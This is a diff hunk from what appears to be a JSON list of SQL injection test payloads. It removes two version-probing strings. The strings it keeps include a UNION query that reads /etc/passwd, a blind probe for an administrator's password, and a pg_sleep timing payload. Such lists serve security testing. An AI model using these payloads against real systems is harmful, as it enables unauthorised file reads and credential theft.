@@ -28,7 +28,5 @@
 "2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)",
 "2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)",
 "' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1",
-"1%20and%20substring(version(),1,1)=5",
-"(substring(version(),1,1)=5)",
 "1';select pg_sleep(2); —"
 ]}
